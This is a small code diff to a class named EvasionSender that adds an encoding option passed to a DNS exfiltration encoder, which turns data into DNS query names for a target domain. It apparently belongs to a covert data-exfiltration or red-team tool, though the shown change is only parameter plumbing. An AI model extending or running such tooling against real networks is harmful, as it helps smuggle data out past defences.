@@ -167,6 +167,7 @@ class EvasionSender:
         encoder = DNSExfilEncoder(
             target_domain=self.exfil_config.target_domain,
             chunk_size=self.exfil_config.chunk_size,
+            encoding=self.exfil_config.encoding,
         )
         encode_result = encoder.encode(data)
         fqdns = encode_result.fqdns
